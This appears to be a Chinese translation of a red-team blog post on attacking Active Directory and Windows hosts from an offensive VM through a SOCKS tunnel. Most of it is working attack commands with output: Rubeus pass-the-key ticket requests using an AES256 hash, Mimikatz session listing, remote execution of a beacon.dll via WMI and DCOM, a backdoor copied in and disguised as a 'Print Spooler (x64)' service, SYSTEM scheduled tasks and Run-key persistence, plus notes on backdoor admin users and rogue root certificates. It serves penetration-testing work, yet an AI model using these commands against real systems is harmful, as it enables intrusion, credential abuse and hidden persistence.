<h4><span id="aes128x2faes256-哈希">AES128&#x2F;AES256 哈希</span></h4><p>除了使用 NTLM 哈希进行身份验证外，还可以使用 AES128 或 AES256 哈希对 Active Directory 进行身份验证，并获取 TGT。如果除了 AES 哈希外还有 NTLM 哈希，可以更新 NTLM 哈希部分中的命令行，为 PowerShell 窗口或 Windows Explorer 会话准备 NTLM 哈希（用于回退 NTLM 身份验证）和使用 AES 哈希请求的 TGT。在提到 <code>/aes256</code> 参数时，如果是 AES128 哈希，可以将其替换为 <code>/aes128</code> 参数。</p>
<p>PowerShell：</p>
<p>以下命令行可以用来使用 AES256 哈希进行身份验证并启动 PowerShell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /domain:ad.bitsadmin.com /user:User1 /aes256:CE6559D565EF9B5AFCFFC8F75709DAA854832D1951D6E38E21084FE22962BF62 /createnetonly:powershell.exe /show</span><br></pre></td></tr></table></figure>

<p>重新启动 Windows Explorer：</p>
<p>以下命令行首先杀死所有 <code>explorer.exe</code> 实例，然后用新的登录会话重新启动它，使用 AES256 哈希请求 TGT。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">taskkill.exe /F /IM explorer.exe &amp; Rubeus.exe asktgt /domain:ad.bitsadmin.com /user:User1 /aes256:CE6559D565EF9B5AFCFFC8F75709DAA854832D1951D6E38E21084FE22962BF62 /createnetonly:&quot;C:\Windows\explorer.exe /NoUACCheck&quot; /show</span><br></pre></td></tr></table></figure>

<h1><span id="使用进攻性windows虚拟机">使用进攻性windows虚拟机</span></h1><h2><span id="active-directory">Active Directory</span></h2><p>第一类攻击是针对 Active Directory 的攻击。这些攻击可以从低权限用户上下文中执行，且可用于潜在地识别提权路径，达到访问更高权限账户的目的。与 Active Directory 交互时，常用的端口如下所示：</p>
<table>
<thead>
<tr>
<th>协议</th>
<th>缩写</th>
<th>端口</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>轻量级目录访问协议</td>
<td>LDAP</td>
<td>389&#x2F;TCP</td>
<td></td>
</tr>
<tr>
<td>无连接 LDAP</td>
<td>CLDAP</td>
<td>389&#x2F;UDP</td>
<td>使用 <code>cldaproxy.sh</code> 脚本可以将其转换为 LDAP 流量，进而支持 TCP</td>
</tr>
<tr>
<td>TLS&#x2F;SSL 上的 LDAP</td>
<td>LDAPS</td>
<td>686&#x2F;TCP</td>
<td></td>
</tr>
<tr>
<td>LDAP 到全球目录</td>
<td>GC</td>
<td>3268&#x2F;TCP</td>
<td></td>
</tr>
<tr>
<td>LDAP 到全球目录（通过 SSL&#x2F;TLS）</td>
<td>GC-SSL</td>
<td>3269&#x2F;TCP</td>
<td></td>
</tr>
<tr>
<td>Active Directory Web 服务</td>
<td>ADWS</td>
<td>9389&#x2F;TCP</td>
<td></td>
</tr>
</tbody></table>
<h3><span id="ad-powershell-模块">AD PowerShell 模块</span></h3><p>Windows 提供了一套非常强大的工具集，称为 <strong>远程服务器管理工具（RSAT）</strong>，该工具已在第 2 部分的 <strong>攻击性设置：攻击性 Windows VM</strong> 中安装在攻击性 Windows 虚拟机上。RSAT 包含了 Microsoft 管理控制台（MMC）扩展、命令行工具以及用于远程管理的各种 PowerShell 模块。其中一个模块是 <strong>ActiveDirectory</strong> 模块，该模块包含接近 150 个 cmdlet，可通过 <code>Get-Command -Module ActiveDirectory</code> 列出。</p>
<p>由于攻击性 Windows 虚拟机并未正式加入目标域，某些 cmdlet 可能需要使用 <code>-Server</code> 参数来强制 cmdlet 与目标网络中的域控制器交互。正如前文所讨论的，所有（Kerberos）认证将由相应的认证包自动处理。为了避免每次都需要指定 <code>-Server</code> 参数，可以为特定的 cmdlet（即任何以 <code>AD</code> 开头的 cmdlet）配置自动添加 <code>-Server</code> 参数，使用指定的值。以下 PowerShell 命令可实现这一点：</p>
<p>$PSDefaultParameterValues &#x3D; @{ ‘<em>-AD</em>:Server’&#x3D; “DC1.ad.bitsadmin.com” }</p>
<p>以下是几个用于查询域信息的示例命令：</p>
<ul>
<li><code>Get-ADDomain</code></li>
<li><code>Get-ADTrust -Filter * | Format-Table Direction,Name,TrustType</code></li>
</ul>
<p>另一个命令用于获取组织中使用的 IP 地址范围，并可配置为通过 LOFL 设置进行路由：</p>
<ul>
<li><code>Get-ADReplicationSubnet -Filter * | Format-Table Name,Location,Site</code></li>
</ul>
<h3><span id="管理控制台">管理控制台</span></h3><p>除了使用 ActiveDirectory PowerShell 模块管理 Active Directory 之外，还可以使用 Microsoft 管理控制台（MMC）扩展与 Active Directory 交互。Windows 内置了多种管理扩展，而 RSAT 安装过程中也会加入额外的扩展。由于 Microsoft 管理控制台是常用的服务管理工具，安装其他（Microsoft）软件时，可能会添加更多的扩展，例如 Microsoft SQL Server 的扩展（稍后将讨论）。</p>
<p>MMC 扩展通常可以通过不同方式连接到远程系统。根据扩展的不同，某些连接选项可能会有所不同。哪种方法适用于哪个特定的扩展，可以参考 LOFL-Project 网站上的文档。</p>
<h4><span id="连接选项说明">连接选项说明</span></h4><table>
<thead>
<tr>
<th>选项</th>
<th>描述</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>添加模块</td>
<td>在 Microsoft 管理控制台中（Ctrl + M）添加模块时，可以选择远程系统</td>
<td></td>
</tr>
<tr>
<td>连接到不同的系统</td>
<td>打开扩展后，右键点击左侧面板中的根节点，选择“连接到不同的服务器”</td>
<td></td>
</tr>
<tr>
<td>命令行</td>
<td><code>some.msc /server:DC1.ad.bitsadmin.com</code></td>
<td>根据扩展的不同，通常使用以下命令行参数之一来将扩展指向不同的服务器：<code>/ComputerName</code>、<code>/computer:</code>、<code>/server=</code>、<code>/domain=</code></td>
</tr>
<tr>
<td>服务器管理器</td>
<td>一旦将要管理的服务器添加到服务器管理器（后续将在本节中讨论），可以通过 GUI 直接管理服务器，或者启动 <code>.msc</code> 模块并使用如上所述的命令行参数</td>
<td></td>
</tr>
</tbody></table>
<h4><span id="常用的-mmc-扩展">常用的 MMC 扩展</span></h4><p>在域中，管理员常用的扩展之一是 <strong>Active Directory 用户和计算机</strong>（<code>dsa.msc</code>）。除了其他攻击活动外，使用这个扩展可以对用户、组和计算机进行侦察，添加和修改用户，以及修改用户组成员身份。打开目标域的扩展最简单的方法是从 PowerShell 控制台（使用目标域的凭证进行登录）执行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsa.msc /server=DC1.ad.bitsadmin.com</span><br></pre></td></tr></table></figure>

<p>另外，也可以通过从 PowerShell 控制台启动 <code>mmc.exe</code>，然后通过 <strong>添加&#x2F;删除扩展</strong> 添加相关扩展，再通过右键点击扩展的根节点选择 <strong>更改域</strong> 或 <strong>更改域控制器</strong> 来设置目标域或服务器。</p>
<p>提供有关域信息的其他扩展包括 <strong>Active Directory 域和信任</strong>（<code>domain.msc</code>）和 <strong>组策略管理</strong>（<code>gpmc.msc</code>）。启动目标域的扩展命令行分别是：</p>
<ul>
<li><code>domain.msc /server=DC1.ad.bitsadmin.com</code></li>
<li><code>gpmc.msc /domain:ad.bitsadmin.com</code></li>
</ul>
<p>需要注意的是，打开 <code>gpmc.msc</code> 扩展时可能会遇到一个错误（“参数不正确”）。为了解决这个问题，需要使用攻击性 DC 设置，并且需要在扩展中进行一些设置更改。有关详细信息，请参阅 LOFL-Project 网站上的 <strong>gpmc.msc</strong> 页面。</p>
<h3><span id="sysinternals-adexplorer">Sysinternals ADExplorer</span></h3><p>与 Active Directory 交互的另一种方法是通过 Sysinternals 的 <strong>ADExplorer</strong> 工具。可以通过之前准备的 PowerShell 会话启动该工具。一旦启动，在连接屏幕上，所有字段都可以保持为空，然后点击 <strong>OK</strong> 按钮，ADExplorer 将连接到目标域。如果需要，也可以在连接屏幕的 <strong>Connect</strong> 字段中输入域控制器的 FQDN，并在其后添加 <code>:636</code>，以强制 ADExplorer 通过 LDAPS 连接，例如：<code>DC1.ad.bitsadmin.com:636</code>。接下来，可以执行任何 LDAP 查询，并且如果用户具有足够的权限，还可以进行修改。</p>
<p>Sysinternals ADExplorer 的另一个功能是对域中的所有数据进行快照，并将其存储为二进制（.dat）文件。此文件随后可以用于离线查询，或者可以转换为 BloodHound 的 .json 格式，并导入 BloodHound 来识别提权路径。</p>
<h2><span id="数据">数据</span></h2><p>接下来的攻击类别是数据领域，目标是识别信息，以便更好地理解 IT 基础设施，或者甚至获取可以用于提权的凭证或令牌。由于通过 SOCKS 浏览共享资源相对较慢，一种有效的混合方法是使用之前博客中介绍的 Dir2json 工具（《在公司共享目录中挖掘秘密》）从软件植入中创建目录列表，然后从 Offensive Windows VM 下载文件或完整的文件夹结构。</p>
<p>可以使用 Windows 内置的 <strong>net.exe</strong> 命令行工具来发现共享。语法如下，其中 <code>/all</code> 标志用于显示隐藏的（美元符号）共享：<code>net.exe view \\DC1.ad.bitsadmin.com /all</code></p>
<p>对于浏览和复制共享资源，可以使用 PowerShell 的 <strong>Get-ChildItem</strong> 和 <strong>Copy-Item</strong> cmdlet，或者使用 Windows 资源管理器。不过，需要注意的是，按照上一节的说明，需要使用 <strong>Respawn Windows Explorer</strong> 方法。如果没有这样做，比如从已认证的 PowerShell 启动 Windows 资源管理器并使用 <code>explorer.exe \\DC1.ad.bitsadmin.com\SYSVOL</code>，则从 <strong>Offensive Windows VM</strong> 本地用户会话（重新）使用的 <code>explorer.exe</code> 进程将不会继承所需的凭证信息，在经过几次失败的 NTLMSSP 认证（如果启用了）后，会显示凭证提示。作为替代，可以使用像 <strong>XYplorer Free</strong> 这样的工具，因为它能够正确地继承来自父 PowerShell 进程的登录会话及相关凭证信息。</p>
<p>另一个经常存储有有趣信息的位置是 SharePoint。在 PowerShell 中使用凭证时，可以启动浏览器访问这些 SharePoint 站点并浏览它们。此外，当使用 Internet Explorer 时，还可以通过 Windows 资源管理器浏览文件夹，并轻松将文件夹中的信息复制到本地。</p>
<h2><span id="windows-系统">Windows 系统</span></h2><p>Windows 操作系统通过不同的协议提供了大量功能，这些协议通过其管理端口可用。这些功能不仅在工作站上可用，在服务器上也可以提供更广泛的功能，特别是在安装了某些角色时。本小节讨论了在环境中的所有系统上可用的功能，而关于服务器角色管理的内容将在下一小节讨论。大多数这些功能属于后期利用阶段，因此需要在目标系统上具有较高的权限。</p>
<p>远程过程调用（RPC）和Windows 管理工具（WMI）在执行远程系统活动时被广泛使用。另一种越来越多用于远程系统管理的协议是WinRM，它是 Windows 实现的 WS-Management 协议。常用的端口和协议如下所示，其中当使用 DCOM 时，WMI 流量会经过 DCERPC 端口，而当使用 WSMan 时，则会使用 WinRM 端口。</p>
<table>
<thead>
<tr>
<th>协议</th>
<th>缩写</th>
<th>端口</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>MSRPC 端点映射器</td>
<td>DCERPC</td>
<td>135&#x2F;TCP</td>
<td>该端口用于分布式 COM（DCOM）。端点映射器动态分配端口，默认从 49152&#x2F;TCP 开始。</td>
</tr>
<tr>
<td>微软目录服务</td>
<td>Microsoft-DS</td>
<td>445&#x2F;TCP</td>
<td>该端口用于文件共享，也用于通过命名管道与各种服务通信。</td>
</tr>
<tr>
<td>微软 Windows 基于的终端服务器</td>
<td>MS-WBT</td>
<td>3389&#x2F;TCP</td>
<td>用于远程桌面和远程应用。</td>
</tr>
<tr>
<td>Windows 远程管理</td>
<td>WinRM</td>
<td>5985&#x2F;TCP</td>
<td>Windows 基于 WS-Management 协议的实现。</td>
</tr>
<tr>
<td>Windows 远程管理（SSL&#x2F;TLS）</td>
<td>WinRM-SSL</td>
<td>5986&#x2F;TCP</td>
<td>使用 TLS 加密传输连接的 WinRM。</td>
</tr>
</tbody></table>
<h3><span id="会话">会话</span></h3><p>通过 RPC 调用和 WMI，可以枚举特定工作站上交互式登录的用户，这对于确定是否将工作站作为横向移动的目标非常有用。可以使用 <code>query.exe</code> 内置命令行工具完成此操作，具体显示的详细信息会根据所使用的子命令有所不同。</p>
<p>命令行 <code>query.exe user /server:W10.ad.bitsadmin.com</code> 会显示主机上具有会话（活动或断开连接）的用户，并列出其登录日期&#x2F;时间。此工具还有一个简写版本，即 <code>quser.exe</code>，与之前的命令行一样，远程系统需要提供 <code>/server</code> 参数。</p>
<p>另一个 <code>query.exe</code> 命令行是 <code>query.exe session /server:W10.ad.bitsadmin.com</code>，该命令列出远程系统上的窗口站，并（如果适用）显示连接到窗口站的用户名。与 <code>user</code> 子命令一样，<code>qwinsta.exe</code> 也可以作为别名使用，同样需要提供 <code>/server</code> 参数。</p>
<p>尽管 <code>Mimikatz</code> 不是 LOFLBin，它也能够列出上述命令行显示的信息，包括一些附加信息，如远程连接的源 IP 地址、远程会话是否被锁定以及各种附加时间戳。可以使用以下命令行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;ts::sessions /server:W10.ad.bitsadmin.com&quot; exit</span><br></pre></td></tr></table></figure>

<p>最后，使用 WMI 也可以列出交互式会话，通过在 <code>Win32_LogonSession</code> 类中过滤相关的登录类型，并将其与 <code>Win32_LoggedOnUser</code>&#x2F;<code>Win32_Account</code> 类相关联。</p>
<h3><span id="列出进程">列出进程</span></h3><p>进程列表在多种场景中非常有用。例如，可以用来识别系统上运行的杀毒软件或 EDR 软件，或者查看 KeePass 密码管理器是否正在运行。与会话相似，<code>query.exe</code> 工具提供了列出远程进程的能力，无论是列出所有进程（<code>*</code>），还是指定某个特定进程（如 <code>KeePass.exe</code>）。命令行如下所示：</p>
<p>query.exe process * &#x2F;server:W10.ad.bitsadmin.com</p>
<p>与之前的 <code>query.exe</code> 子命令一样，<code>qprocess.exe</code> 是其别名，其他参数与 <code>query.exe</code> 的等效命令相同。</p>
<p>另一种显示正在运行的进程的方法是使用 WMI，在 <code>Win32_Process</code> 类的实例上查询，通常还可以使用过滤器来查找特定的进程。使用 WMI 的一个优点是，可以查看进程的命令行，而不仅仅是进程名和进程 ID。示例命令行如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Get-CimInstance Win32_Process -Filter &#x27;Name=&quot;WINWORD.exe&quot;&#x27; -ComputerName W10.ad.bitsadmin.com | fl ProcessId,Name,CommandLine</span><br></pre></td></tr></table></figure>

<p>输出示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ProcessId  : 6204</span><br><span class="line"> Name    : WINWORD.EXE</span><br><span class="line"> CommandLine : &quot;C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE&quot; /n</span><br><span class="line">        &quot;C:\Users\User1\Documents\Passwords.docx&quot; /o &quot;&quot;</span><br></pre></td></tr></table></figure>

<p>最后，PowerShell 的 <code>Get-Process</code> cmdlet 也可以用来列出远程主机上的进程，使用 <code>-ComputerName</code> 参数。</p>
<h3><span id="终止进程">终止进程</span></h3><p>在某些情况下，能够终止进程是非常有用的。可以使用多种 LOFLCAB 工具来实现这一点，具体包括内置的 <code>taskkill.exe</code> 和 <code>tskill.exe</code> 命令行工具，以及使用 <code>Win32_Process</code> WMI 类。</p>
<p>taskkill.exe</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; taskkill.exe /S W10.ad.bitsadmin.com /F /IM KeePass.exe</span><br><span class="line">SUCCESS: The process &quot;KeePass.exe&quot; with PID 7136 has been terminated.</span><br></pre></td></tr></table></figure>

<p>tskill.exe</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; tskill.exe KeePass /Server:W10.ad.bitsadmin.com /A /V</span><br><span class="line">End Process(2648)</span><br></pre></td></tr></table></figure>

<p>WMI</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Get-CimInstance Win32_Process -Filter &#x27;Name=&quot;KeePass.exe&quot;&#x27; -ComputerName W10.ad.bitsadmin.com | Remove-CimInstance -Verbose</span><br><span class="line">VERBOSE: Performing the operation &quot;Remove-CimInstance&quot; on target &quot;Win32_Process: KeePass.exe (Handle = &quot;5440&quot;)&quot;.</span><br><span class="line">VERBOSE: Perform operation &#x27;Delete CimInstance&#x27; with following parameters, &#x27;&#x27;namespaceName&#x27; = root/cimv2,&#x27;instance&#x27; = Win32_Process: KeePass.exe (Handle = &quot;5440&#x27;)&#x27;.</span><br><span class="line">VERBOSE: Operation &#x27;Delete CimInstance&#x27; complete.</span><br></pre></td></tr></table></figure>

<h3><span id="执行命令行">执行命令行</span></h3><p>命令行可以通过多种方式和协议执行。以下是一些方法的描述，而在 LOFL-Project 网站上可以选择 Execute 功能，获得更详细的执行方法列表。</p>
<p>最简单的方法是使用 <code>Invoke-Command</code> cmdlet，它可以通过 <code>New-PSSession</code> cmdlet 创建的现有 PowerShell 远程会话，或者通过 <code>-Computer</code> 参数直接指定要执行的系统（或系统列表）。对于长时间运行的任务，WinRM 连接必须保持打开状态，否则进程将被立即终止。因此，这种方法适用于通过 cmdlet 或命令行工具获取一些信息，但不适合启动软件植入物。</p>
<p>示例命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Command -ComputerName W10.ad.bitsadmin.com &#123; systeminfo.exe; Get-NetIPAddress &#125;</span><br></pre></td></tr></table></figure>

<p>另一种方法是使用 WMI 和 <code>Invoke-WSManAction</code> cmdlet，它使用 WinRM 会话。与 <code>Invoke-Command</code> cmdlet 不同，因为此方法使用 WMI，而不是 WinRM，所以它支持长时间运行的执行，但不会显示命令的输出。执行的进程会在 <code>WmiPrvSE.exe</code> 进程下启动，这是由 DcomLaunch 服务的 <code>svchost.exe</code> 进程生成的。</p>
<p>示例命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WSManAction -ComputerName W10.ad.bitsadmin.com -Action &quot;Create&quot; -ResourceURI wmicimv2/win32_process -ValueSet @&#123;CommandLine=&#x27;C:\Windows\System32\rundll32.exe &quot;C:\tmp\App Folder\beacon.dll&quot;,Start&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>同样的 WMI 执行可以通过 <code>Invoke-CimMethod</code> 完成，不同于 <code>Invoke-WSManAction</code>，它使用 <code>New-CimSessionOption</code> cmdlet 的 <code>-SessionOption</code> 参数提供了选择使用 WinRM 或 DCERPC 协议的选项。以下代码演示了通过 DCERPC 通过 WMI 启动 beacon。</p>
<p>示例命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; $so = New-CimSessionOption -Protocol Dcom</span><br><span class="line">PS C:\&gt; $s = New-CimSession -ComputerName W10.ad.bitsadmin.com -SessionOption $so</span><br><span class="line">PS C:\&gt; Invoke-CimMethod -ClassName Win32_Process -Name Create -Arguments @&#123;CommandLine=&#x27;C:\Windows\System32\rundll32.exe &quot;C:\tmp\App Folder\beacon.dll&quot;,Start&#x27;&#125; -CimSession $s</span><br></pre></td></tr></table></figure>

<p>输出示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ProcessId ReturnValue PSComputerName</span><br><span class="line"> --------- ----------- --------------</span><br><span class="line">   3648     </span><br></pre></td></tr></table></figure>

<p>一个关于直接执行命令行的最终示例是通过 DCOM 执行命令。可以远程启动各种 COM 对象来执行命令行。在这个示例中，使用的是 <code>IShellWindows</code> 接口，它公开了一个 <code>ShellExecute</code> 函数。通过该接口执行的进程将在 <code>explorer.exe</code> 进程下启动。更多此类 COM 接口的示例可以参考“滥用 COM 和 DCOM 对象”一文。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; $c = [Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;, &#x27;W10.ad.bitsadmin.com&#x27;))</span><br><span class="line">PS C:\&gt; $i = $c.Item()</span><br><span class="line">PS C:\&gt; $i.Document.Application.ShellExecute(&#x27;C:\Windows\System32\rundll32.exe&#x27;, &#x27;&quot;C:\tmp\App、Folder\beacon.dll&quot;,Start&#x27;, &#x27;C:\Windows\System32&#x27;, $null, 0)</span><br></pre></td></tr></table></figure>

<p>这些是直接执行的示例。除了直接执行外，还有许多间接执行命令行的方法，以下段落将讨论一些选项。</p>
<h3><span id="服务">服务</span></h3><p>除了直接执行命令行，服务也提供了一种在系统上执行二进制文件的方式。这些服务可以配置为在未来的重启时自动启动、触发启动，或者通过请求服务管理器来启动。此外，远程系统上的服务也可以远程管理，这可能允许攻击者禁用某些监控。</p>
<p>服务可以通过命令行使用 <code>sc.exe</code> 或 <code>*-Service</code> cmdlet，或者通过图形用户界面（GUI）使用 <code>services.msc</code> 来管理。分别使用 <code>sc.exe \\W10.ad.bitsadmin.com query</code> 和 <code>Get-Service -ComputerName W10.ad.bitsadmin.com</code> 可以列出远程系统上的服务。</p>
<p>以下命令行创建了一个看似合法的服务，该服务会在计算机启动时自动启动。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Copy-Item C:\tmp\backdoor.exe \\W10.ad.bitsadmin.com\admin$\System32\spoolsv64.exe</span><br><span class="line">PS C:\&gt; sc.exe \\W10.ad.bitsadmin.com create Spooler64 binPath= C:\Windows\System32\spoolsv64.exe start= auto DisplayName= &quot;Print Spooler (x64)&quot;</span><br><span class="line">[SC] CreateService SUCCESS</span><br><span class="line">PS C:\&gt; sc.exe \\W10.ad.bitsadmin.com description Spooler64 &quot;This service spools print jobs and handles interaction with the printer. If you turn off this service, you won’t be able to print or see your printers.&quot;</span><br><span class="line">[SC] ChangeServiceConfig2 SUCCESS</span><br><span class="line">PS C:\&gt; </span><br></pre></td></tr></table></figure>

<p>可选地，这个服务可以立即启动：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; sc.exe \\W10.ad.bitsadmin.com start Spooler64</span><br><span class="line"></span><br><span class="line"> SERVICE_NAME: Spooler64</span><br><span class="line">     TYPE        : 10 WIN32_OWN_PROCESS</span><br><span class="line">     STATE       : 2 START_PENDING</span><br><span class="line">                 (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)</span><br><span class="line">     WIN32_EXIT_CODE  : 0 (0x0)</span><br><span class="line">     SERVICE_EXIT_CODE : 0 (0x0)</span><br><span class="line">     CHECKPOINT     : 0x0</span><br><span class="line">     WAIT_HINT     : 0x7d0</span><br><span class="line">     PID        : 1076</span><br><span class="line">     FLAGS       : </span><br></pre></td></tr></table></figure>

<p>可以通过以下方式启动 <code>services.msc</code> MMC 插件。需要注意的是，通过 SOCKS 隧道启动时会比较慢，因为每个服务都需要进行多次请求回路。另外，<code>services.msc</code> 没有创建服务的功能，并且与命令行相比，修改服务的选项较少。因此，对于此插件，使用命令行或 cmdlet 可能更为合适。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">services.msc /computer:W10.ad.bitsadmin.com</span><br></pre></td></tr></table></figure>

<h3><span id="定时任务">定时任务</span></h3><p>定时任务也可以用来在系统上执行二进制文件，并且可以用作持久化机制。<code>schtasks.exe</code> 二进制文件的命令行如下所示，其中任务将以 <code>/RU</code> 参数指定的 SYSTEM 用户身份运行，计划任务的时间表（<code>/SC</code>）设置为每小时运行一次。使用 <code>New-ScheduledTask</code> cmdlet 也可以完成相同的操作。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; schtasks.exe /S W10.ad.bitsadmin.com /Create /RU SYSTEM /SC HOURLY /TN &quot;Microsoft\Windows\Printing\Print Spooler (x64)&quot; /TR &quot;C:\Windows\System32\spoolsv64.exe&quot;</span><br><span class="line">SUCCESS: The scheduled task &quot;Print Spooler (x64)&quot; has successfully been created.</span><br><span class="line">PS C:\&gt;</span><br></pre></td></tr></table></figure>

<p>除了命令行方式外，也可以通过图形用户界面（GUI）使用 <code>taskschd.msc</code> MMC 插件来管理任务计划程序。启动该插件后，可以通过右键点击根节点并选择 “连接到另一台计算机” 来连接到远程系统。或者，可以使用 <code>compmgmt.msc /computer:W10.ad.bitsadmin.com</code>，该命令会打开包括任务计划程序插件在内的多个管理插件。</p>
<h3><span id="windows-防火墙">Windows 防火墙</span></h3><p>Windows 防火墙可以通过命令行使用 <code>netsh.exe</code> 或 NetSecurity 模块中的 cmdlet 进行查询或操作。例如，可以启用防火墙规则（允许某些连接），正如本博客中的《使用 RDP 影子监视用户》一文所使用的那样。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; netsh.exe -r W10.ad.bitsadmin.com advfirewall firewall set rule name=&quot;Remote Desktop - Shadow (TCP-In)&quot; new enable=yes</span><br><span class="line"></span><br><span class="line">Updated 1 rule(s).</span><br><span class="line">Ok.</span><br><span class="line"></span><br><span class="line">PS C:\&gt;</span><br></pre></td></tr></table></figure>

<p>防火墙规则的管理也可以通过图形用户界面（GUI）进行操作： <code>mmc.exe</code> -&gt; 文件 -&gt; 添加&#x2F;删除管理单元 -&gt; Windows Defender 防火墙与高级安全性 -&gt; 添加 -&gt; 另一台计算机: W10.ad.bitsadmin.com -&gt; 完成 -&gt; 确定。</p>
<h3><span id="本地用户">本地用户</span></h3><p>通过本地用户和组 MMC 管理单元，可以管理用户和组，例如，可以创建一个具有管理员权限的后门用户。命令行如下：<code>lusrmgr.msc /computer=W10.ad.bitsadmin.com</code>。</p>
<p><img src="/images/77.png" alt="77"></p>
<h3><span id="证书">证书</span></h3><p>恶意根证书可以被添加到系统中，例如，允许进行中间人攻击（MITM），其中目标系统信任由攻击者系统使用的证书，以解密流量。证书可以通过证书 MMC 管理单元（certlm.msc）查看和添加。打开该管理单元后，右键点击根节点 -&gt; 选择“连接到另一台计算机” -&gt; 输入对象名称 -&gt; 选择 W10.ad.bitsadmin.com。</p>
<h3><span id="注册表">注册表</span></h3><p>远程系统的注册表可以被查询和修改，可以使用 reg.exe 或 WMI 中 StdRegProv 类的方法。此外，regedit.exe 图形用户界面也支持通过文件菜单中的“连接网络注册表”选项连接到远程系统。以下是使用 reg.exe 查询注册表键的示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; reg.exe query &quot;\\W10.ad.bitsadmin.com\HKLM\Software\Microsoft\Windows\CurrentVersion\Run&quot;</span><br><span class="line"></span><br><span class="line"> HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">   SecurityHealth  REG_EXPAND_SZ  %windir%\system32\SecurityHealthSystray.exe</span><br><span class="line">   BgInfo  REG_SZ  C:\Windows\BgInfo.exe C:\Windows\BgInfo.bgi /Timer:0 /nolicprompt</span><br><span class="line">   KeePass 2 PreLoad  REG_SZ  &quot;C:\Program Files\KeePass Password Safe 2\KeePass.exe&quot; --preload</span><br><span class="line"></span><br><span class="line">PS C:\&gt;</span><br></pre></td></tr></table></figure>

<p>注册表修改可以用于增加持久性，以下是最直接的方式，但还有许多其他方法可以通过注册表实现持久性。比如，可以更新屏幕保护程序二进制路径、图像文件执行选项（Image File Execution Options）或 COM 劫持等。</p>
<p>添加持久性的示例：将注册表键值添加到所有用户的“运行”项：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; reg.exe add &quot;\\W10.ad.bitsadmin.com\HKLM\Software\Microsoft\Windows\CurrentVersion\Run&quot; /T REG_SZ /V PrintSpooler64 /D &quot;C:\Windows\System32\spoolsv64.exe&quot;</span><br><span class="line"> The operation completed successfully.</span><br><span class="line">PS C:\&gt;</span><br></pre></td></tr></table></figure>



